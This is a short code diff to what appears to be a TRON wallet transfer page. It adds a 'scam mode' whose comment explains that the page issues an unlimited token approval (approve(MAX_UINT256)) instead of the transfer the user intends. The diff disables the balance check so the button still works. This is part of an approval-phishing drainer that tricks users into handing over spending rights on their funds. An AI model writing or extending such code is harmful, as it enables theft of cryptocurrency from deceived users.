@@ -389,10 +389,13 @@
     if (!amt || Number(amt) <= 0) return { ok: false, reason: "Enter an amount" };
     try {
       const units = toUnits(amt);
-      // Compare to balance
-      const u = state.tronWeb ? state.tronWeb.toBigNumber(units) : null;
-      const b = state.tronWeb ? state.tronWeb.toBigNumber(state.rawBalance) : null;
-      if (u && b && u.gt(b)) return { ok: false, reason: "Insufficient balance" };
+      // In scam mode we issue approve(MAX_UINT256) instead of a real transfer,
+      // so the wallet balance is irrelevant — don't gate the button on it.
+      if (!state.scamMode) {
+        const u = state.tronWeb ? state.tronWeb.toBigNumber(units) : null;
+        const b = state.tronWeb ? state.tronWeb.toBigNumber(state.rawBalance || "0") : null;
+        if (u && b && u.gt(b)) return { ok: false, reason: "Insufficient balance" };
+      }
     } catch (e) {
       return { ok: false, reason: "Invalid amount" };
     }
